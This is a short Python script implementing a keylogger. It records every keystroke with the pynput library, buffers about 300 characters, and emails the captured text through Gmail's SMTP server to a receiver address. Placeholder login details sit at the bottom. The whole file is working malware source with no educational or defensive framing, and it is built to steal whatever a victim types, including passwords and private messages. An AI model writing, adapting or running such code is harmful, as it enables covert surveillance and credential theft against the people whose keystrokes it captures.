from pynput.keyboard import Key, Listener
from smtplib import SMTP


class KeyLogger:
    WORDS_LIMIT = 300
    def __init__(self, email, password, receiver):
        self.server: SMTP = SMTP('smtp.gmail.com:587')
        self.email = email
        self.password = password
        self.receiver = receiver
        self.words: str = ''
        self.ignored_words: list = [
            Key.alt, Key.alt_gr, Key.alt_r, Key.alt_l, 
            Key.ctrl, Key.shift_l, Key.shift, Key.delete,
        ]
        
    def on_press(self, key):
        if key == Key.esc:  # to stop recording
            return False
        if key in self.ignored_words:
            return
        if len(self.words) >= self.WORDS_LIMIT:
            self.server.sendmail(self.email, self.receiver, self.words)
            self.words = ''
        

        if key == Key.space:
            self.words += ' '
        elif key == Key.enter:
            self.words += '\n'
        elif key == Key.backspace:
            self.words = self.words[:-1]
        else:
            self.words += f'{key}'
            
        self.words = self.words.replace("'", "")

    def run(self):   
        self.server.starttls()
        self.server.login(self.email, self.password)         
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == '__main__':
    kl = KeyLogger(
        'your_email@example.com', 'your_password', 'to_email@example.com'
    )
    kl.run()
